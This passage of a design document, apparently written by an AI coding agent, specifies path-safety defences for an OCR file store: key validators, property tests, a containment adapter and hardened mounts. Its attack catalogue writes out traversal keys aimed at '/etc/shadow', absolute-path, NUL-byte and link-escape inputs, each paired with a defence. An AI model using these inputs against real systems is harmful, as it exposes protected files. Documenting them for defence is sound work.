§7.1 shows the bug this prevents.

---

## 3. Path safety

This is the security-critical section. Each attack is stated, then the defence, then the layer it
lives in. **Defence in depth is deliberate: every attack below is killed twice.**

### 3.1 The root mistake, stated first

> **"The key is derived from user input at all."**

Every other item in this list is a *symptom* of this one. Traversal, NUL bytes, unicode tricks, and
case collisions are all only reachable if some byte the client controls ends up in a path. The
primary defence is therefore **structural, not validational**: the mint function's signature makes
user input unrepresentable.

```ts
// src/domain/storage/mint-key.ts
import { createHash } from 'node:crypto';
import { ulid } from 'ulidx';            // ulidx@2.4.1 (verified on npm 2026-09-09)
import { ALLOWED_MEDIA, type AllowedMedia, type DocumentId,
         type ObjectKey, type ObjectKind, type TenantId } from './types';

/**
 * The ONLY function permitted to produce an ObjectKey (other than assertSafeObjectKey, which
 * only re-validates a key already read back from the database).
 *
 * NOTE THE SIGNATURE: there is no `filename`, no `string`, no `unknown`, no options bag.
 *   - tenantId / documentId : branded ids that can only be produced by the auth context and by
 *                             the database default; a request body cannot forge a Brand.
 *   - kind                  : closed union of 5 literals.
 *   - mediaType             : key of the closed ALLOWED_MEDIA map, produced by CONTENT SNIFFING
 *                             (file-type@22.0.2 magic bytes), never by the client's
 *                             Content-Type header and never by the uploaded filename.
 *   - createdAt             : server clock.
 * There is no parameter through which an attacker-controlled byte can travel.
 */
export function mintObjectKey(input: {
  tenantId: TenantId;
  documentId: DocumentId;
  kind: ObjectKind;
  mediaType: AllowedMedia;
  createdAt: Date;
}): ObjectKey {
  const { tenantId, documentId, kind, mediaType, createdAt } = input;

  const yyyy  = String(createdAt.getUTCFullYear()).padStart(4, '0');
  const mm    = String(createdAt.getUTCMonth() + 1).padStart(2, '0');
  const shard = createHash('sha256').update(documentId).digest('hex').slice(0, 2);
  const ext   = ALLOWED_MEDIA[mediaType];              // total map, no fallback branch
  const oid   = ulid().toLowerCase();

  const key = `${tenantId.toLowerCase()}/${yyyy}/${mm}/${shard}/${documentId.toLowerCase()}/${kind}/${oid}.${ext}`;
  return assertSafeObjectKey(key);                     // mint output is validated too
}
```

**Machine-enforced, not review-enforced.** Three mechanisms:

1. **Branding.** `ObjectKey` is `string & { [unique symbol]: 'ObjectKey' }`. A plain `string` from
   `await request.formData()` is not assignable to it. `as ObjectKey` is the only escape hatch.
2. **ESLint** — ban the escape hatch outside two files:
   ```jsonc
   // eslint.config.js
   {
     files: ['src/**/*.ts'],
     ignores: ['src/domain/storage/mint-key.ts', 'src/domain/storage/assert-key.ts'],
     rules: {
       'no-restricted-syntax': ['error', {
         selector: 'TSAsExpression > TSTypeReference > Identifier[name="ObjectKey"]',
         message: 'ObjectKey may only be produced by mintObjectKey() or assertSafeObjectKey().'
       }]
     }
   }
   ```
3. **dependency-cruiser** — forbid the storage domain from importing anything transport-shaped:
   ```js
   // .dependency-cruiser.js
   { name: 'storage-domain-is-pure',
     severity: 'error',
     from: { path: '^src/domain/storage' },
     to:   { path: '^(next|react|@prisma|@aws-sdk|node:http)' } }
   ```
4. **Property tests** (the proof, in CI). Three of them, and the second and third exist because
   the first alone gave a false sense of completeness in the initial draft:
   ```ts
   // src/domain/storage/mint-key.test.ts
   import fc from 'fast-check';

   // (a) The absence of a channel: no filename can influence the key.
   it('key is invariant under every possible uploaded filename', () => {
     const args = { tenantId: T, documentId: D, kind: 'original' as const,
                    mediaType: 'application/pdf' as const, createdAt: new Date(0) };
     // mintObjectKey has no filename parameter, so this asserts the *absence* of a channel:
     fc.assert(fc.property(fc.fullUnicodeString(), (_attackerFilename) => {
       const k = mintObjectKey(args);
       // only the per-object ULID varies; structure is fixed
       expect(k.split('/').slice(0, 6).join('/'))
         .toBe(`${T.toLowerCase()}/1970/01/${SHARD}/${D.toLowerCase()}/original`);
     }));
   });

   // (b) The REGRESSION GUARD for the false-redundancy claim at §3.2 step (4a).
   //     If someone deletes the per-segment traversal check because "the regex covers it",
   //     assertion 2 fails loudly and points at the reason.
   it('KEY_RE alone does NOT stop traversal - the per-segment check is load-bearing', () => {
     expect(KEY_RE.test('a/../b')).toBe(true);                    // regex says yes
     expect(() => assertSafeObjectKey('a/../b')).toThrow();       // validator says no
   });

   // (c) The validator must reject everything the alphabet excludes, for arbitrary input.
   it('rejects every non-conforming string', () => {
     fc.assert(fc.property(fc.fullUnicodeString(), (s) => {
       const ok = (() => { try { assertSafeObjectKey(s); return true; } catch { return false; } })();
       if (!ok) return true;
       // Anything accepted must satisfy every structural invariant simultaneously.
       return /^[0-9a-z][0-9a-z._\-/]*[0-9a-z]$/.test(s)
         && s.split('/').length === 7
         && s.split('/').every((g) => g.length > 0 && g !== '.' && g !== '..'
                                      && !g.startsWith('.') && !g.startsWith('-'));
     }));
   });
   ```
   The Python twin of (b) and (c) runs in the worker's own suite (§1.3.1) — a TypeScript-only
   proof does not cover a second runtime that writes to the same tree.

### 3.2 The validator

```ts
// src/domain/storage/assert-key.ts
import { StorageError, type ObjectKey } from './types';

/** Windows reserved device basenames. Not reachable given the ASCII-lowercase alphabet below,
 *  but kept as an explicit assertion so the reasoning survives a future alphabet change. */
const RESERVED_WIN = new Set([
  'con', 'prn', 'aux', 'nul',
  ...Array.from({ length: 9 }, (_, i) => `com${i + 1}`),
  ...Array.from({ length: 9 }, (_, i) => `lpt${i + 1}`),
]);

/** S3 hard limit is 1024 UTF-8 bytes. We cap at 512 to leave headroom for a migration prefix. */
const KEY_MAX = 512;
const SEG_MAX = 64;
const MIN_SEGMENTS = 7;
const MAX_SEGMENTS = 7;

/** ASCII lowercase alnum, plus '/', '.', '-', '_'. MUST start and end with [0-9a-z]. */
const KEY_RE = /^[0-9a-z](?:[0-9a-z._\-/]*[0-9a-z])?$/;

export function assertSafeObjectKey(raw: unknown): ObjectKey {
  // (0) type
  if (typeof raw !== 'string') {
    throw new StorageError('invalid-key', 'key must be a string');
  }

  // (1) length. Also bounds every regex below (no catastrophic backtracking on a 10 MB string).
  if (raw.length === 0 || raw.length > KEY_MAX) {
    throw new StorageError('invalid-key', `key length ${raw.length} outside 1..${KEY_MAX}`);
  }

  // (2) THE MASTER CHECK -- but read the scope note at (4a) before assuming it does more than
  //     it does. A single ASCII-lowercase allowlist simultaneously kills:
  //       - NUL byte            (0x00 not in [0-9a-z._\-/])
  //       - every control char  (idem)
  //       - absolute paths      (must start [0-9a-z], so a leading '/' is rejected)
  //       - Windows separators  ('\' not in the class)
  //       - overlong UTF-8      (any codepoint > 0x7A is rejected; a JS string carrying a lone
  //                              surrogate or a decoded overlong sequence cannot pass)
  //       - unicode confusables / RTL overrides / zero-width joiners
  //       - EVERY Thai codepoint (U+0E00..U+0E7F) -- see attack 7
  //       - uppercase           (case-collision immunity, attack 9)
  //       - trailing '/', '.', '-', ' '  (must END [0-9a-z])
  if (!KEY_RE.test(raw)) {
    throw new StorageError('invalid-key', 'key contains a byte outside the ASCII allowlist');
  }

  // (3) no empty segments; kills '//' and any '/./' collapse ambiguity
  if (raw.includes('//')) {
    throw new StorageError('invalid-key', 'empty path segment');
  }

  // (4) per-segment
  const segments = raw.split('/');
  if (segments.length < MIN_SEGMENTS || segments.length > MAX_SEGMENTS) {
    throw new StorageError('invalid-key', `key must have exactly ${MAX_SEGMENTS} segments`);
  }
  for (const seg of segments) {
    if (seg.length === 0 || seg.length > SEG_MAX) {
      throw new StorageError('invalid-key', 'segment length out of range');
    }
    // (4a) TRAVERSAL. *** THIS CHECK IS LOAD-BEARING, NOT REDUNDANT. ***
    //      An earlier draft of this document claimed it was "unreachable given (2)+(3)".
    //      THAT CLAIM IS FALSE and was verified false on node v22.22.3 this session:
    //
    //          KEY_RE.test('a/../b')  ===  true      <-- traversal passes the master check
    //          'a/../b'.includes('//') === false      <-- and passes step (3)
    //
    //      Why: KEY_RE's ^ and $ anchors bind the FIRST and LAST character of the WHOLE STRING,
    //      not of each segment. 'a/../b' starts with 'a' and ends with 'b'; the '..' sits
    //      entirely in the interior, where '.' is a permitted alphabet member (it has to be --
    //      the '.ext' suffix needs it). Steps (2) and (3) do not constrain segment interiors at
    //      all. This check and the seg.startsWith('.') check below are the ONLY things standing
    //      between a caller-supplied key and path traversal.
    //
    //      Do not delete it, and do not "optimise" it away on the strength of the regex.
    //      The property test in §3.1 asserts KEY_RE.test('a/../b') === true precisely so that
    //      anyone who re-derives the false claim is contradicted by a red CI run.
    if (seg === '.' || seg === '..') {
      throw new StorageError('invalid-key', 'path traversal segment');
    }
    if (seg.startsWith('.') || seg.startsWith('-')) {
      // leading '.'  -> hidden file, and the '..' family
      // leading '-'  -> argument injection if a key is ever passed to a CLI (tesseract, gs, pdftoppm)
      throw new StorageError('invalid-key', 'segment may not start with "." or "-"');
    }
    if (RESERVED_WIN.has(seg.split('.', 1)[0]!)) {
      throw new StorageError('invalid-key', 'reserved device name');
    }
  }

  return raw as ObjectKey;
}
```

> **A note on step (1)'s units.** `raw.length` counts UTF-16 code units, while `KEY_MAX = 512` is
> reasoned about against S3's 1024-**byte** limit. For any string that survives step (2) these are
> identical (pure ASCII → 1 byte per unit), and step (1) runs first only to bound the regex. A
> non-ASCII string is therefore length-checked in the wrong unit for one step and then rejected —
> no security consequence, but do not "simplify" by moving the length check after the regex and
> then reusing `raw.length` as a byte count somewhere else.

### 3.2.1 The prefix validator — a prefix is not a key

`assertSafeObjectKey` demands **exactly 7 segments** and forbids a trailing `/`. `list()`'s
argument is neither: §5.4 passes `{tenantId}/`, and the migration verifier passes
`{tenantId}/{yyyy}/`. The first draft said `list`'s prefix was "validated as a key prefix, same
rules as a key", which no key prefix can satisfy — the check would have thrown on every legitimate
call, and the likely field fix would have been to skip validation entirely on the argument that
reaches `readdir`. A prefix therefore gets its **own** validator with its own rules:

```ts
// src/domain/storage/assert-key.ts (continued)

/** 1..6 complete segments, ALWAYS trailing-slash-terminated so it can never match a partial
 *  segment. Without the mandatory trailing '/', prefix "t/2026/0" would match "t/2026/09/..."
 *  AND a hypothetical "t/2026/0x/...", and on S3 a prefix is a raw string match with no
 *  segment awareness at all. */
export function assertSafeKeyPrefix(raw: unknown): KeyPrefix {
  if (typeof raw !== 'string') throw new StorageError('invalid-key', 'prefix must be a string');
  if (raw.length === 0 || raw.length > KEY_MAX) {
    throw new StorageError('invalid-key', 'prefix length out of range');
  }
  if (!raw.endsWith('/')) throw new StorageError('invalid-key', 'prefix must end with "/"');
  if (raw.includes('//')) throw new StorageError('invalid-key', 'empty path segment');

  const segments = raw.slice(0, -1).split('/');          // drop the terminator, then reuse the rules
  if (segments.length < 1 || segments.length >= MIN_SEGMENTS) {
    throw new StorageError('invalid-key', `prefix must have 1..${MIN_SEGMENTS - 1} segments`);
  }
  for (const seg of segments) {
    if (!/^[0-9a-z][0-9a-z._\-]*$/.test(seg)) {          // per-segment anchors: no '/' inside
      throw new StorageError('invalid-key', 'prefix segment outside the ASCII allowlist');
    }
    if (seg.length > SEG_MAX) throw new StorageError('invalid-key', 'prefix segment too long');
    if (seg === '.' || seg === '..') throw new StorageError('invalid-key', 'traversal segment');
    if (seg.startsWith('.') || seg.startsWith('-')) {
      throw new StorageError('invalid-key', 'prefix segment starts with "." or "-"');
    }
    if (RESERVED_WIN.has(seg.split('.', 1)[0]!)) {
      throw new StorageError('invalid-key', 'reserved device name');
    }
  }
  return raw as KeyPrefix;
}

/** The only sanctioned constructors. Both take branded ids, so no request string can reach them. */
export const tenantPrefix = (t: TenantId): KeyPrefix =>
  assertSafeKeyPrefix(`${t.toLowerCase()}/`);
export const documentPrefix = (t: TenantId, d: DocumentId, at: Date): KeyPrefix =>
  assertSafeKeyPrefix(`${t.toLowerCase()}/${yyyy(at)}/${mm(at)}/${shardOf(d)}/${d.toLowerCase()}/`);
```

Note the **per-segment** anchors in the inner regex (`^…$` around a class with no `/`). This is the
fix for exactly the scope mistake documented at step (4a): anchoring the whole string leaves segment
interiors unconstrained, so the prefix validator anchors each segment individually instead.

### 3.3 Attack catalogue

Verification commands are in `/private/tmp/claude-501/-Users-innovera-Documents-OCR/1a7afa9f-b878-43e2-ae68-2396a902286a/scratchpad/probe.js`
and the inline `python3` heredoc run this session.

**1. `../` traversal.**
*Attack:* key `t/2026/09/7a/d/original/../../../../../../etc/shadow`.
*Verified hazard:* `path.join('/data/ocr-files', '../../etc/passwd')` returns **`/etc/passwd`** —
`path.join` normalises and silently escapes. It is **not** a containment function.
*Defence 1:* validator step **(4a)** — `.` cannot begin a segment, and `..` is rejected outright.
Note this is **step (4a) alone**, not step (2): `KEY_RE.test('a/../b')` is `true` (verified — see
the corrected comment at §3.2 step (4a)). The alphabet allowlist does *not* stop traversal.
*Defence 2:* `resolve()`'s `startsWith(root + sep)` check after `path.join` (§3.4).

**2. Absolute path injection.**
*Attack:* key `/etc/shadow`.
*Verified hazard:* `path.resolve('/data/ocr-files', '/etc/passwd')` returns **`/etc/passwd`**.
`path.resolve` treats an absolute second argument as a new root. Using `resolve` instead of `join`
is a common and silent vulnerability.
*Defence 1:* `KEY_RE` requires the first character to be `[0-9a-z]`.
*Defence 2:* the local adapter uses `path.join`, never `path.resolve`, plus the prefix check.

**3. Symlink escape.**
*Attack:* a symlink inside the tree (planted by a compromised sibling process, a restored backup,
or an unpacked archive) points at `/etc/`; our write follows it and clobbers a system file, or our
read exfiltrates one.
*Defence 1:* `O_NOFOLLOW` on every `open` of a leaf. Verified present: `fs.constants.O_NOFOLLOW = 256`
on this macOS host. **Use the constant, never the literal — the value is platform-specific
(Linux x86-64 differs).**
*Defence 2:* the root is `realpath`'d **once at construction** and cached, so a symlinked root
component is resolved before any prefix comparison.
*Defence 3:* every intermediate directory is created by us with `mode 0o700`; the mount is
`nosuid,nodev,noexec` and owned solely by the app uid, so no other principal can plant a link.
*Residual, stated honestly:* `O_NOFOLLOW` guards only the **final** component. Node exposes no
`openat`/`openat2`, so an intermediate-directory swap is not closable in pure Node. On Linux 5.6+
the complete fix is `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)` via a native addon.
**UNVERIFIED / deferred past M1** — the mitigation is that the only writer to the tree is us,
inside a `--read-only` container.

**4. Hardlink.**
*Attack:* attacker hardlinks `/etc/shadow` into our tree at a valid-looking key; our authorised
download route streams it out. `O_NOFOLLOW` does **not** help — a hardlink is not a symlink.
*Defence 1 (structural, decisive):* **hard links cannot cross filesystems.** `/data/ocr-files` is a
dedicated mount, so no inode outside it is linkable into it. This is the single strongest reason
the storage root is its own volume rather than a directory on `/`.
*Defence 2:* after `open`, `fstat` the **descriptor** (not the path) and assert
`st.nlink === 1 && st.uid === process.getuid()`. Verified: `FileHandle.stat()` exposes `nlink`,
`uid`, `mode`.

**5. NUL byte.**
*Attack:* key `t/…/ok.pdf\u0000.html` — truncation in a C-level API, so the extension check sees
`.html` and the syscall opens `ok.pdf`.
*Verified:* Node throws `ERR_INVALID_ARG_VALUE` — *"The argument 'path' must be a string,
Uint8Array, or URL without null bytes"*. Python throws `ValueError: embedded null byte`.
*Defence:* both runtimes reject it, **and** validator step (2) rejects it first, so it never reaches
a syscall and never produces a confusing runtime error.

**6. Windows device names.**
*Attack:* a segment named `nul`, `con`, `com1`, or `nul.pdf`. On Windows these resolve to devices;
writing to `nul` silently discards data (a stealth data-loss bug, not a breach).
*Relevance:* the production runtime is Linux, but a Windows developer or a Windows-side export
tool would hit it, and `Content-Disposition` filenames are consumed by Windows clients.
*Defence 1:* `RESERVED_WIN` check on the basename.
*Defence 2:* the ASCII-lowercase alphabet also rules out Windows' superscript variants (`COM¹`,
`COM²`, `COM³`), which are treated as `COM1/2/3` and are routinely missed by allowlists.
*Note:* the check is applied to the **download filename** in §7.2 as well, where it actually matters.

**7. Unicode normalisation tricks — the Thai finding.**

This is the most important item in this section, and it **invalidates the standard mitigation**.

*The standard advice:* "normalise filenames to NFC and compare; equal strings are the same file."

*Verified counter-example, run this session in Node v22.22.3 and Python 3.9.6:*

| String | Codepoints | UTF-8 |
|---|---|---|
| `กำ` | `U+0E01` `U+0E33` (KO KAI + SARA AM) | `e0b881 e0b8b3` |
| `กํา` | `U+0E01` `U+0E4D` `U+0E32` (KO KAI + NIKHAHIT + SARA AA) | `e0b881 e0b98d e0b8b2` |

```
thai raw equal  : false
thai NFC equal  : false      <-- NFC does NOT unify them
thai NFD equal  : false      <-- NFD does NOT unify them either
thai NFKC equal : TRUE       <-- NFKC DOES unify them
thai NFKD equal : TRUE       <-- so does NFKD
```

These two strings **render identically** in every Thai font.

**The precise Unicode fact, which the first draft got half-right and which changes the
recommendation.** U+0E33 THAI CHARACTER SARA AM has **no canonical decomposition — but it does
have a *compatibility* decomposition.** Verified this session:

```python
>>> unicodedata.decomposition('ำ')
'<compat> 0E4D 0E32'
```

The `<compat>` tag is the whole story. NFC and NFD apply **canonical** mappings only, so neither
collapses the pair — that part of the draft was correct. NFKC and NFKD apply compatibility
mappings, so **both do collapse it**, normalising `กำ` → `ก` + U+0E4D + U+0E32. Concluding from
"NFC/NFD fail" that "Unicode normalisation is useless for Thai" is wrong, and it throws away the
one tool that actually answers the user-facing question.

(For contrast, the Latin case normalises under all four forms: `café` NFC/NFD unify correctly —
verified in the same run. Note also that Thai combining marks *do* have non-zero canonical
combining classes — SARA U/UU are ccc=103, the four tone marks MAI EK…MAI CHATTAWA are ccc=107,
PHINTHU is ccc=9 — so NFC *does* reorder a mis-ordered vowel/tone pair into canonical order even
though it cannot touch SARA AM. Verified this session.)

*Consequences for a Thai-primary OCR product:*
- A "duplicate filename" check based on **NFC** equality **fails silently** for Thai. Two uploads
  that look identical to the user are two distinct DB rows.
- A key derived from a Thai filename would produce two distinct keys for one apparent document —
  and, on a normalisation-insensitive filesystem, possibly one file (see attack 9).
- Any dedup/idempotency logic keyed on the filename is **wrong for the primary market** — but the
  right response is not "abandon normalisation", it is "use the right form for each job".

*Defence 1 (eliminates the surface entirely):* the key is ASCII-only by construction. Validator
step (2) rejects every codepoint in `U+0E00..U+0E7F` — and also the Thai digits ๐–๙
(U+0E50..U+0E59), which live in the same block but are frequently forgotten when people write
"strip Thai letters". Thai text cannot reach a path under any normalisation form.

*Defence 2 — three columns, three forms, each with one job.* The first draft stored one
NFC-normalised display column and stopped. That is not enough to serve Thai search or Thai
near-duplicate warnings:

| Column | Normalisation | Used for | Never used for |
|---|---|---|---|
| `original_filename` | **NFC** | Display, `Content-Disposition` (§7.2) | Uniqueness, lookup, paths |
| `filename_fold` | **NFKC** + `toLowerCase()` | Case/spelling-insensitive **search** and the "you may have uploaded this before" *warning* | Anything authoritative |
| `sha256` | n/a (bytes) | Dedup, idempotency, integrity | Display |

  NFC — not NFKC — is correct for the display column because NFKC would silently rewrite the
  user's `ำ` into `ํา`, changing the bytes of a name they typed. Preserve what they wrote; fold
  only into a *derived* comparison column. Store `filename_fold` as a generated column so it can
  never drift from `original_filename`.

*Defence 3 (authoritative identity):* idempotency and dedup key on `sha256` of the **content**
plus `tenantId` — a byte-exact, encoding-free identity, enforced by the partial unique index added
to §2.3. This correctly deduplicates the same scan uploaded under two different Thai spellings,
which is the actual user-facing requirement. `filename_fold` only ever produces a soft warning;
it must never block an upload, because two genuinely different documents can share a name.

**8. Overlong UTF-8.**
*Attack:* encode `/` as the two-byte overlong `C0 AF` to slip past a byte-level filter, then let a
lenient decoder collapse it back to `/`.
*Verified:* Python's strict UTF-8 decoder rejects it —
`UnicodeDecodeError: 'utf-8' codec can't decode byte 0xc0 in position 0: invalid start byte`.
Node's `Buffer.toString('utf8')` substitutes U+FFFD rather than collapsing to `/`.
*Defence:* validator step (2) operates on a **JS string** (already decoded) and rejects any
codepoint above `0x7A`, including U+FFFD. Keys are never validated at the byte level, which is
where overlong tricks live.

**9. Case-insensitive filesystem collisions on macOS.**

*Verified on this exact workstation:*
```
Volume:  Macintosh HD, APFS
NFC written -> exists under NFD?              True     (normalisation-INSENSITIVE)
open(NFD variant, 'x')  -> FileExistsError            (normalisation-INSENSITIVE)
open('doc.pdf','x') after 'Doc.PDF' -> FileExistsError (case-INSENSITIVE)
stored bytes: 636166c3a92e706466 = "caf\xc3\xa9.pdf"   (normalisation-PRESERVING)
```
So macOS APFS here is **case-insensitive and normalisation-insensitive, but preserving**, while the
production Linux ext4/XFS is case-sensitive and normalisation-agnostic.

*The hazard is a dev/prod divergence in both directions:*
- A test asserting that two case-variant keys are distinct **passes on Linux CI, fails on a Mac**.
- Worse, an `ifAbsent` guard that appears to work on macOS (because `O_EXCL` catches the collision)
  provides no such protection on Linux, where both files coexist.

*Defence 1 (structural):* lowercase-only key alphabet (validator step 2). Case collisions are
unrepresentable, so macOS and Linux behave identically.
*Defence 2:* no Thai/non-ASCII in keys, so the normalisation-insensitivity difference is likewise
unreachable.
*Defence 3:* CI runs the storage integration suite on `ubuntu-latest` (ext4) **and** `macos-latest`
(APFS) so the divergence is caught if the alphabet is ever widened.

**10. TOCTOU between validate and write.**
*Attack:* validate path P → attacker replaces a component of P with a symlink → we `open(P)` and
follow it. The window is between the check and the use.
*Defence — do not check-then-use; make the use itself safe:*
- Never `stat(path)` then `open(path)`. Always `open` first, then `fstat` the **descriptor**.
- Write with `O_WRONLY|O_CREAT|O_EXCL|O_NOFOLLOW` — atomic create-or-fail; `O_EXCL` means the kernel
  refuses if anything already exists at that name, so a swap loses the race by construction.
- Read with `O_RDONLY|O_NOFOLLOW`, then `fstat(fd)` for `isFile()`, `nlink === 1`, `uid`.
- `realpath` the root once at boot and cache it; do not `realpath` per request (the root's own
  resolution is the only part that can legitimately change, and it should not change at runtime).
*Residual:* intermediate-directory TOCTOU remains open in pure Node (see attack 3). Mitigated by
sole-writer + `0700` + dedicated mount + read-only container rootfs, not by code.

### 3.4 Belt-and-braces containment in the local adapter

```ts
// src/infrastructure/storage/local-file-storage.ts
import { constants as C } from 'node:fs';
import * as fsp from 'node:fs/promises';
import * as path from 'node:path';
import { StorageError, type ObjectKey } from '@/domain/storage/types';
import { assertSafeObjectKey } from '@/domain/storage/assert-key';

export class LocalFileStorage implements FileStorage {
  private constructor(
    private readonly rootReal: string,   // realpath'd, no trailing separator
    private readonly tmpReal: string,    // realpath'd, SAME filesystem as rootReal
  ) {}

  static async create(root: string, tmp: string): Promise<LocalFileStorage> {
    // realpath the root ONCE. A symlinked root is resolved here and nowhere else.
    const rootReal = await fsp.realpath(root);
    const tmpReal  = await fsp.realpath(tmp);

    const rs = await fsp.lstat(rootReal);
    if (!rs.isDirectory()) throw new StorageError('unavailable', 'root is not a directory');
    if ((rs.mode & 0o777) !== 0o700) {
      throw new StorageError('unavailable',
        `root mode must be 0700, got 0${(rs.mode & 0o777).toString(8)}`);
    }
    if (rs.uid !== process.getuid!()) {
      throw new StorageError('unavailable', `root uid ${rs.uid} != process uid ${process.getuid!()}`);
    }
    // tmp and objects MUST share a device, or rename() fails EXDEV and atomicity is lost.
    const ts = await fsp.lstat(tmpReal);
    if (ts.dev !== rs.dev) {
      throw new StorageError('unavailable',
        `tmp dev ${ts.dev} != root dev ${rs.dev}: rename() would not be atomic`);
    }
    return new LocalFileStorage(rootReal, tmpReal);
  }

  /**
   * Belt-and-braces. Even if assertSafeObjectKey is ever weakened by a refactor, nothing here
   * can address a path outside rootReal.
   */
  private resolve(key: ObjectKey): string {
    assertSafeObjectKey(key);                       // brace 1: revalidate, always
    const abs = path.join(this.rootReal, key);      // join, never resolve (attack 2)

    // brace 2: join() already normalised; if the result differs from an explicit normalize, the
    // key smuggled something the validator missed. Fail closed.
    if (abs !== path.normalize(abs)) {
      throw new StorageError('invalid-key', 'non-normal path');
    }
    // brace 3: the prefix check. `+ path.sep` is load-bearing -- without it,
    // "/data/ocr-files-evil/x" passes a bare startsWith("/data/ocr-files").
    if (!abs.startsWith(this.rootReal + path.sep)) {
      throw new StorageError('invalid-key', 'path escapes storage root');
    }
    return abs;
  }

  async get(key: ObjectKey, options?: { range?: ByteRange }): Promise<ReadHandle> {
    const abs = this.resolve(key);
    let fh: fsp.FileHandle;
    try {
      // O_NOFOLLOW: the leaf may not be a symlink (attack 3).
      fh = await fsp.open(abs, C.O_RDONLY | C.O_NOFOLLOW);
    } catch (e) {
      const code = (e as NodeJS.ErrnoException).code;
      if (code === 'ENOENT')  throw new StorageError('not-found', key, { cause: e });
      if (code === 'ELOOP')   throw new StorageError('invalid-key', 'symlink at leaf', { cause: e });
      throw e;
    }
    // fstat the DESCRIPTOR, not the path -- closes the TOCTOU window (attack 10).
    const st = await fh.stat();
    if (!st.isFile())                     { await fh.close(); throw new StorageError('not-found', 'not a regular file'); }
    if (st.nlink !== 1)                   { await fh.close(); throw new StorageError('invalid-key', 'hardlinked object'); }   // attack 4
    if (st.uid !== process.getuid!())     { await fh.close(); throw new StorageError('invalid-key', 'foreign owner'); }

    // brace 4: the object's own realpath must still sit under the root. Catches an intermediate
    // directory that was a symlink at open time.
    //
    // HONEST CAVEAT, because this contradicts the rule stated in attack 10: this is a PATH-based
    // check performed AFTER a successful open, so it can disagree with the fd we actually hold
    // (the path could be re-pointed between the open and the realpath). It is therefore ADVISORY
    // DEFENCE IN DEPTH, not the authoritative check -- it can only ever add a rejection, never
    // authorise a read that the fd-based checks above already rejected. The authoritative,
    // fd-anchored identity is (st.dev, st.ino) from fh.stat(); the truly airtight version
    // requires openat2(RESOLVE_BENEATH) and is deferred with attack 3.
    // Deliberately kept because a mismatch here is a high-signal alert that someone is
    // manipulating the tree -- log it at ERROR, do not merely 404.
    const real = await fsp.realpath(abs);
    if (!real.startsWith(this.rootReal + path.sep)) {
      await fh.close();
      throw new StorageError('invalid-key', 'realpath escapes storage root');
    }
    // ... build ReadHandle from fh.readableWebStream() / createReadStream({start,end}) ...
  }
}
```

**Two things this class must NOT do, stated so a future edit does not add them:**

1. **Put the key or `abs` into a thrown message.** `StorageError('not-found', key)` above is
   shorthand for a code path where the key goes into structured log context, not into
   `Error.message` — an error message can reach a 500 body, a client SDK, or an unredacted log
   sink, and an absolute path plus a tenant-scoped key is an information leak
   (it discloses tenant ids, document ids, and the on-disk layout). The corrected contract is in
   §1.2's `StorageError` note.
2. **Reintroduce a `stat(path)`-before-`open(path)` pattern anywhere**, including in a "cheap
   existence check" fast path. `exists()` is implemented as an `open`+`close` (or `HeadObject`),
   never as `fsp.stat`.

---

## 4. Local disk deployment at `/data/ocr-files`

> Verified: `/data` does **not** exist on this workstation (`ls -ld /data` → `No such file or
> directory`). Everything in this section is a target-host design for the Linux VPS, not an
> observation. Local development uses `./.data/ocr-files` with the same code path.

### 4.1 Directory layout

```
/data/ocr-files/              0700 ocrapp:ocrapp   <- dedicated mount point
├── objects/                  0700 ocrapp:ocrapp   <- the only place keys resolve into
│   └── {tenantId}/{yyyy}/{mm}/{shard}/{documentId}/{kind}/{oid}.{ext}    0600
├── tmp/                      0700 ocrapp:ocrapp   <- in-flight writes; SAME FILESYSTEM as objects/
├── quarantine/               0700 ocrapp:ocrapp   <- checksum/AV failures, never served
└── trash/                    0700 ocrapp:ocrapp   <- optional pre-GC holding area (§5)
```

`tmp/` is a **sibling of `objects/`, inside the same mount, and outside the key namespace.** Two
reasons, both load-bearing:
1. `rename(2)` is atomic only **within one filesystem**. `/tmp` (usually tmpfs) → `/data` returns
   `EXDEV` and forces a copy, destroying atomicity. `LocalFileStorage.create` asserts `st.dev`
   equality at boot rather than discovering this in production.
2. If `tmp/` lived under `objects/`, the GC's `list(prefix)` walk would see half-written `.part`
   files and either delete a live upload or report a phantom object.

### 4.2 Ownership, permissions, mount

```bash
# host provisioning (Ansible/cloud-init). Numeric ids so the container and host agree.
groupadd -g 10001 ocrapp
useradd  -u 10001 -g 10001 -M -s /usr/sbin/nologin ocrapp

install -d -o 10001 -g 10001 -m 0700 /data/ocr-files/{objects,tmp,quarantine,trash}

# /etc/fstab -- dedicated volume, hostile mount options
/dev/mapper/ocrvg-files  /data/ocr-files  xfs  defaults,nodev,nosuid,noexec,noatime  0 2
```

| Option | Why |
|---|---|
| dedicated volume | **Makes cross-filesystem hardlinks impossible** (attack 4). Also caps blast radius of a disk-full event to storage — the OS, Postgres WAL, and logs keep running. |
| `nosuid` | An uploaded ELF with the setuid bit is inert. |
| `nodev` | A crafted device node cannot become `/dev/mem`. |
| `noexec` | An uploaded binary cannot be `exec`'d, even by a compromised worker. This is the mitigation for "OCR engine has an RCE and drops a payload in the upload dir". |
| `noatime` | Removes one write per read; relevant at high page-image read rates. |
| `0700` dirs / `0600` files | Only uid 10001 can traverse or read. Combined with `umask 077` in the app process so a missed explicit mode still lands safe. |

**XFS over ext4:** chosen for `readdir` performance on large directories and for project quotas
(§4.5). *Rejected:* ext4 (adequate; `dir_index` handles our post-shard ~390 entries fine — the
decision is close and would flip on operator familiarity). *Rejected:* ZFS — better checksums and
snapshots, but the RAM cost and out-of-tree module on a small VPS is not justified at M1.

### 4.3 Container mount and the "can it write anywhere else" proof

```yaml
# compose.yaml (excerpt) -- Docker 29.5.2 verified present on this workstation
services:
  web:
    image: innovera-ocr-web:${TAG}
    user: "10001:10001"
    read_only: true                       # <-- the whole rootfs is immutable
    cap_drop: [ALL]
    security_opt:
      - no-new-privileges:true
    tmpfs:
      - /tmp:rw,noexec,nosuid,nodev,size=64m,mode=1777
    volumes:
      - type: bind
        source: /data/ocr-files
        target: /data/ocr-files
        bind: { propagation: rprivate }
    environment:
      STORAGE_DRIVER: local
      STORAGE_ROOT: /data/ocr-files/objects
      STORAGE_TMP:  /data/ocr-files/tmp
```

**Proof that the app user cannot write outside the mount:**

| Path | Writable? | Why |
|---|---|---|
| `/` and all image layers | No | `read_only: true` makes the container rootfs a read-only overlay. |
| `/tmp` | Yes, 64 MiB, `noexec` | Explicit tmpfs. Bounded, non-executable, discarded on restart. |
| `/data/ocr-files/**` | Yes | The one bind mount. `noexec,nosuid,nodev` on the host. |
